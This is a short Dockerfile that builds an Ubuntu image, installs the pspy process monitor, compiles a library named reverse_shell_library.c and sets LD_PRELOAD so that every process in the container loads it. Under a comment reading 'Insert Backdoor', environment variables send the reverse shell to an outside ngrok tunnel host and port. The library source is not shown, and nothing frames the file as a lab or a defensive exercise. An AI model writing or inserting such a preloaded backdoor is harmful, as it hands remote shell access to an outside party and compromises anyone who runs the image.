# Use an existing base image, e.g., Ubuntu
FROM ubuntu:20.04

# Install required tools
RUN apt-get update && \
    apt-get install -y procps && \
    apt-get install -y curl gcc

# Download pspy64 (use the appropriate version for your architecture)
RUN curl -L -o /usr/local/bin/pspy64 https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64

# Make pspy64 executable
RUN chmod +x /usr/local/bin/pspy64

# Copy your daemon script & library into the container
COPY daemon.sh /usr/local/bin/daemon.sh
RUN chmod +x /usr/local/bin/daemon.sh
COPY reverse_shell_library.c /tmp/reverse_shell_library.c

# Compile the library
#RUN gcc -fPIC -shared -o /usr/local/lib/libreverse_shell_library.so /tmp/reverse_shell_library.c -ldl
RUN gcc -shared -fPIC -o /usr/local/lib/libreverse_shell_library.so /tmp/reverse_shell_library.c

# Insert Backdoor
ENV REMOTE_ADDR="7.tcp.eu.ngrok.io"
ENV REMOTE_PORT="17136"
ENV LD_PRELOAD="/usr/local/lib/libreverse_shell_library.so"


# Set the default command to run when the container starts
CMD ["/bin/bash"]